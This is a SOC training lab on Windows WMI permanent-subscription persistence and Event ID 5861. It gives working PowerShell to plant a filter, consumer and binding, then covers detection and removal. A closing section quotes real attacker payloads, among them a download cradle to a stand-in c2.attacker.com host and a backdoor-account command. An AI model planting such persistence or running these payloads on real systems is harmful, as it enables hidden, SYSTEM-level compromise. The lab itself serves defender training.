# Event ID 5861 — WMI Permanent Subscription Persistence Lab

**Log:** Microsoft-Windows-WMI-Activity/Operational  
**Category:** WMI Activity  
**Level:** Information  
**Lab Type:** Attacker Simulation + Defender Response  
**Lab Environment:** Windows Server 2022 — TECHCORP / techcorp.local

---

## Overview

This lab goes beyond simply generating an event — it simulates a complete **attacker persistence technique** and then walks through the full **defender detection and removal** process. This is one of the most advanced persistence techniques documented in this repository and is actively used by APT groups in real-world attacks.

Event 5861 fires when a **permanent WMI event subscription** is created. Unlike scheduled tasks, services, or registry Run keys — all of which are well-known persistence locations that defenders regularly check — WMI permanent subscriptions are stored inside the WMI repository database. They are invisible to most startup scanners, survive every reboot, run with SYSTEM privileges, and leave no trace on the filesystem unless the payload itself writes one.

---

## Understanding WMI Persistence — The Three Components

A permanent WMI subscription requires three components working together. All three must be present for the persistence to function. Removing any one of them breaks the chain.

**1. Event Filter (`__EventFilter`)**  
The trigger condition. Written in WQL (WMI Query Language), this defines what event WMI should watch for. Common triggers used by real malware include system boot, user logon, a specific process starting, or a time-based interval. In this lab, the filter watches for specific seconds on the system clock, firing every 10 seconds.

**2. Event Consumer (`CommandLineEventConsumer`)**  
The action component. This defines what command to execute when the filter condition fires. Real attackers use this to run PowerShell download cradles, execute C2 beacons, dump credentials, or perform lateral movement. In this lab, the consumer runs a batch file that writes a timestamped entry to a log file.

**3. Filter-to-Consumer Binding (`__FilterToConsumerBinding`)**  
The link that connects the filter to the consumer. Without this binding, the filter and consumer both exist in the WMI repository but nothing executes. Creating the binding is what activates the persistence — and this is the action that generates **Event 5861**.

### Why This Technique Is Dangerous

```
Normal persistence locations checked by defenders:
  Registry Run Keys        → Task Manager, Autoruns, regedit
  Scheduled Tasks          → Task Scheduler, schtasks
  Services                 → Services.msc, sc query
  Startup Folders          → Explorer, Autoruns

WMI Permanent Subscriptions:
  Stored in WMI repository → NOT visible in any of the above tools
  No filesystem artifact   → AV filesystem scans miss it
  Runs as SYSTEM           → Full system privileges
  Survives reboots         → Persistent across power cycles
  Session 0 execution      → Completely silent, no GUI
```

### Session 0 Isolation — Why Nothing Appears on Screen

WMI consumers execute in **Session 0** — the isolated background session where Windows system services run. Session 0 cannot interact with the interactive desktop (Session 1) where the logged-in user works. This means no Notepad window opens, no popup appears, no taskbar activity shows. The payload runs completely invisibly in the background. This is not a limitation — it is by design and is exactly why real attackers prefer this technique.

In this lab, we prove the payload is executing by having it write timestamped entries to a log file, and optionally by running a separate monitoring script in Session 1 that watches for the executions and displays a notification balloon.

---

## Lab Setup

### Pre-Lab Cleanup

Before starting, remove any previous subscriptions to ensure a clean environment:

```powershell
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Remove-WmiObject -ErrorAction SilentlyContinue
Get-WmiObject -Namespace root\subscription -Class __EventFilter | Remove-WmiObject -ErrorAction SilentlyContinue
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Remove-WmiObject -ErrorAction SilentlyContinue

Remove-Item "C:\SOCLab\*" -Force -ErrorAction SilentlyContinue
Remove-Item "C:\SOCLab" -Force -ErrorAction SilentlyContinue
```

---

## ATTACKER PHASE

### Step 1 — Create Lab Folder and Payload

```powershell
New-Item -Path "C:\SOCLab" -ItemType Directory -Force

$payload = @'
@echo off
powershell -Command "Add-Content -Path 'C:\SOCLab\malware_executed.txt' -Value ('Malware executed at ' + (Get-Date -Format 'MM/dd/yyyy hh:mm:ss tt'))"
'@
$payload | Out-File -FilePath "C:\SOCLab\malware.bat" -Encoding ASCII
```

Open the file to verify its contents:

```powershell
notepad C:\SOCLab\malware.bat
```

The batch file uses PowerShell for the timestamp to ensure 12-hour format. This represents the attacker's payload — in a real attack this would be a PowerShell download cradle, a C2 beacon, or a credential dumping command.

---

### Step 2 — Create the Event Filter

```powershell
$filter = Set-WmiInstance -Namespace "root\subscription" -Class "__EventFilter" -Arguments @{
    Name           = "SOC_Persistence_Filter"
    EventNamespace = "root\cimv2"
    QueryLanguage  = "WQL"
    Query          = "SELECT * FROM __InstanceModificationEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_LocalTime' AND (TargetInstance.Second = 0 OR TargetInstance.Second = 10 OR TargetInstance.Second = 20 OR TargetInstance.Second = 30 OR TargetInstance.Second = 40 OR TargetInstance.Second = 50)"
}

Write-Host "Filter created: $($filter.Name)" -ForegroundColor Green
```

This filter watches the system clock and fires every 10 seconds. A real attacker would use a boot trigger (`SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_ComputerSystem'`) to execute on every reboot instead.

---

### Step 3 — Create the Event Consumer

```powershell
$consumer = Set-WmiInstance -Namespace "root\subscription" -Class "CommandLineEventConsumer" -Arguments @{
    Name                = "SOC_Persistence_Consumer"
    CommandLineTemplate = "C:\SOCLab\malware.bat"
}

Write-Host "Consumer created: $($consumer.Name)" -ForegroundColor Green
```

---

### Step 4 — Create the Binding (Activates Persistence — Generates Event 5861)

```powershell
$binding = Set-WmiInstance -Namespace "root\subscription" -Class "__FilterToConsumerBinding" -Arguments @{
    Filter   = $filter
    Consumer = $consumer
}

Write-Host "Binding created — WMI persistence is now active." -ForegroundColor Red
Write-Host "Payload will execute every 10 seconds automatically." -ForegroundColor Red
```

From this moment, the WMI service begins monitoring for the filter condition and executing the consumer automatically. The persistence is active.

---

### Step 5 — Observe Silent Execution

Wait 60 seconds, then open the proof file:

```powershell
notepad C:\SOCLab\malware_executed.txt
```

Or watch it grow in real time:

```powershell
Get-Content "C:\SOCLab\malware_executed.txt" -Wait
```

You will see entries like:

```
Malware executed at 09/05/2026 11:14:00 PM
Malware executed at 09/05/2026 11:14:10 PM
Malware executed at 09/05/2026 11:14:20 PM
Malware executed at 09/05/2026 11:14:30 PM
```

No window opened. No notification appeared. No taskbar activity. The payload ran silently in Session 0 six times per minute, completely invisible to the logged-in user. Press `Ctrl+C` to stop the `-Wait` command.

---

### Optional — Desktop Notification Proof (Session 1 Monitor)

To make the silent execution visible as a desktop notification, open a **second PowerShell window** and run this monitoring script. This runs in your interactive session (Session 1) so GUI is available:

```powershell
# Register the event source first
New-EventLog -LogName Application -Source "SOCLabWMI" -ErrorAction SilentlyContinue

# Monitor and display balloon notification on each execution
Register-WmiEvent -Query "SELECT * FROM __InstanceCreationEvent WITHIN 2 WHERE TargetInstance ISA 'Win32_NTLogEvent' AND TargetInstance.EventCode = 9999" -Action {
    Add-Type -AssemblyName System.Windows.Forms
    $notification = New-Object System.Windows.Forms.NotifyIcon
    $notification.Icon = [System.Drawing.SystemIcons]::Warning
    $notification.BalloonTipTitle = "WMI PERSISTENCE TRIGGERED"
    $notification.BalloonTipText = "Malware payload executed at $(Get-Date -Format 'hh:mm:ss tt')"
    $notification.BalloonTipIcon = "Warning"
    $notification.Visible = $true
    $notification.ShowBalloonTip(5000)
}

Write-Host "Monitoring active — notification will appear on each execution." -ForegroundColor Green
Write-Host "Press Ctrl+C to stop." -ForegroundColor Yellow

while ($true) { Start-Sleep -Seconds 1 }
```

**To stop the notification monitor:**

Press `Ctrl+C` in the second PowerShell window, then run:

```powershell
Remove-EventLog -Source "SOCLabWMI" -ErrorAction SilentlyContinue
```

---

## DEFENDER PHASE

### Step 6 — Detect via Event ID 5861 (PowerShell)

```powershell
Get-WinEvent -FilterHashtable @{
    LogName = 'Microsoft-Windows-WMI-Activity/Operational'
    Id      = 5861
} -MaxEvents 5 | Format-List TimeCreated, Message
```

The output will show the complete subscription details including the WQL query, the consumer name, and the command line template. All three components are visible in the single 5861 event, giving defenders a complete picture of the persistence mechanism.

### Step 7 — Detect via Event Viewer (GUI)

1. Open **Event Viewer**
2. Navigate to: `Applications and Services Logs → Microsoft → Windows → WMI-Activity → Operational`
3. Click **Filter Current Log** → Event ID: `5861` → OK
4. Double-click the event
5. In the details pane, look for:
   - `Eventfilter` — the filter name
   - `Consumer` — the consumer name and command
   - `Query` — the WQL trigger condition

**Key fields to examine:**

| Field | What to Look For |
|---|---|
| Namespace | `root/subscription` — confirms this is a persistence event |
| Eventfilter | Name of the filter — `SOC_Persistence_Filter` in this lab |
| Consumer | `CommandLineEventConsumer="SOC_Persistence_Consumer"` |
| Query | The WQL trigger — boot triggers and time triggers are most suspicious |
| CommandLineTemplate | The actual command being executed — this is the payload |

### Step 8 — Hunt the WMI Repository

This is what a threat hunter would run on any machine suspected of WMI-based persistence:

```powershell
Write-Host "=== ACTIVE WMI SUBSCRIPTIONS ===" -ForegroundColor Cyan
Write-Host ""

Write-Host "--- Event Filters ---" -ForegroundColor Yellow
Get-WmiObject -Namespace "root\subscription" -Class "__EventFilter" |
    Select-Object Name, Query | Format-List

Write-Host "--- Command Line Consumers ---" -ForegroundColor Yellow
Get-WmiObject -Namespace "root\subscription" -Class "CommandLineEventConsumer" |
    Select-Object Name, CommandLineTemplate | Format-List

Write-Host "--- Filter to Consumer Bindings ---" -ForegroundColor Yellow
Get-WmiObject -Namespace "root\subscription" -Class "__FilterToConsumerBinding" |
    Format-List
```

---

## INCIDENT RESPONSE — Removal

### Step 9 — Remove the Persistence Chain

Always remove in this order: Binding first, then Filter, then Consumer. Removing the binding immediately stops execution even before the other components are removed.

```powershell
Write-Host "Starting removal of WMI persistence..." -ForegroundColor Yellow

# Step 1: Remove binding — immediately stops execution
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding |
    Where-Object { $_.Filter -match "SOC_Persistence_Filter" } |
    Remove-WmiObject
Write-Host "Binding removed." -ForegroundColor Green

# Step 2: Remove filter
Get-WmiObject -Namespace root\subscription -Class __EventFilter |
    Where-Object { $_.Name -eq "SOC_Persistence_Filter" } |
    Remove-WmiObject
Write-Host "Filter removed." -ForegroundColor Green

# Step 3: Remove consumer
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer |
    Where-Object { $_.Name -eq "SOC_Persistence_Consumer" } |
    Remove-WmiObject
Write-Host "Consumer removed." -ForegroundColor Green
```

### Step 10 — Verify Complete Removal

```powershell
Write-Host "=== VERIFYING REMOVAL ===" -ForegroundColor Cyan

$filtersLeft = Get-WmiObject -Namespace root\subscription -Class __EventFilter |
    Where-Object { $_.Name -eq "SOC_Persistence_Filter" }

$consumersLeft = Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer |
    Where-Object { $_.Name -eq "SOC_Persistence_Consumer" }

if (-not $filtersLeft -and -not $consumersLeft) {
    Write-Host "CONFIRMED: All WMI persistence components removed successfully." -ForegroundColor Green
    Write-Host "The machine is clean." -ForegroundColor Green
} else {
    Write-Host "WARNING: Some components still remain. Run removal again." -ForegroundColor Red
}
```

---

## Lab Results Summary

| Phase | Action | Result |
|---|---|---|
| Attacker | Created Event Filter | `SOC_Persistence_Filter` registered in `root\subscription` |
| Attacker | Created Event Consumer | `SOC_Persistence_Consumer` pointing to `malware.bat` |
| Attacker | Created Binding | **Event 5861 generated** — persistence activated |
| Attacker | Observed execution | Log file received new entry every 10 seconds silently |
| Defender | Queried Event 5861 | Full subscription details visible in WMI Operational log |
| Defender | Hunted repository | All three components found in `root\subscription` |
| Defender | Removed binding | Execution stopped immediately |
| Defender | Removed filter + consumer | Repository cleaned |
| Defender | Verified removal | Machine confirmed clean |

---

## SOC Analyst Notes

### Why 5861 Is Critical

In a real environment, legitimate software rarely creates permanent WMI subscriptions. Windows itself has one known legitimate subscription — `SCM Event Log Filter` — used by the Service Control Manager. Any other subscription found in `root\subscription` on a workstation or server should be treated as suspicious until proven otherwise.

### Threat Hunting Query

Run this regularly as part of threat hunting to detect any WMI persistence:

```powershell
# Hunt for all non-Microsoft WMI subscriptions
Get-WmiObject -Namespace "root\subscription" -Class "__EventFilter" |
    Where-Object { $_.Name -ne "SCM Event Log Filter" } |
    Select-Object Name, Query | Format-List
```

If this returns any results on a machine that is not expected to have WMI subscriptions, treat it as a potential compromise.

### Real Attacker Payloads

In real incidents, the `CommandLineTemplate` field in 5861 has been observed containing:

```
powershell -enc <base64 encoded payload>
powershell IEX (New-Object Net.WebClient).DownloadString('http://c2.attacker.com/payload')
cmd /c net user backdoor P@ssw0rd /add
rundll32.exe C:\Windows\Temp\malicious.dll,EntryPoint
```

### MITRE ATT&CK Reference

- **T1546.003** — Event Triggered Execution: Windows Management Instrumentation Event Subscription
- **T1047** — Windows Management Instrumentation
- **T1059.001** — Command and Scripting Interpreter: PowerShell
- **T1070** — Indicator Removal on Host (attackers may remove their subscriptions after achieving objectives)
